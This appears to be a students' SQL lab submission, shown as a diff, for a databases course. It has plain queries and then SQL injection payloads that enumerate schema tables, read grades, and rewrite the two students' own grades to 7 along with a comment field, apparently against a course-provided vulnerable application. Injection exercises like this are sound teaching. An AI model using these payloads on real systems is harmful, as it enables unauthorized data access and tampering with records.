@@ -1,0 +1,66 @@
+    INTEGRANTES 
+
+    Franco González 
+    Iván Vidal    
+
+
+#######          P1          #######
+
+### A
+SELECT *
+FROM uchile.transparencia
+WHERE apellido_p='Saure'
+ORDER BY total DESC;
+
+### B
+SELECT nombre, nota
+FROM nota.cc3201
+WHERE nombre='González Leiva, Franco Antonio'
+   or nombre='Vidal Romero, Iván Mauricio';
+
+### C
+UPDATE nota.cc3201
+SET nota = 7
+WHERE nombre='González Leiva, Franco Antonio'
+   or nombre='Vidal Romero, Iván Mauricio';
+
+Resultado:
+ERROR:  permission denied for table cc3201
+
+### D
+SELECT table_name, table_schema FROM information_schema.tables;
+SELECT column_name, data_type FROM information_schema.columns
+WHERE table_name='cc3201' AND table_schema='nota';
+
+
+
+
+
+#######          P2          #######
+
+### A
+';SELECT table_name, table_schema FROM information_schema.tables;--'
+
+### B
+';SELECT column_name, data_type FROM information_schema.columns
+WHERE table_name='cc3201' AND table_schema='nota';--'
+
+### C
+';SELECT nombre, avg(nota) FROM nota.cc3201
+ WHERE nombre='González Leiva, Franco Antonio'   
+   or nombre='Vidal Romero, Iván Mauricio' GROUP BY nombre;--'
+
+### D
+';UPDATE nota.cc3201
+SET nota = 7
+WHERE nombre='González Leiva, Franco Antonio'
+   or nombre='Vidal Romero, Iván Mauricio';--'
+
+### E
+';UPDATE nota.cc3201
+SET comentario = 'Christian Bale Rico'
+WHERE nombre='González Leiva, Franco Antonio'
+   or nombre='Vidal Romero, Iván Mauricio';--'
+
+
+
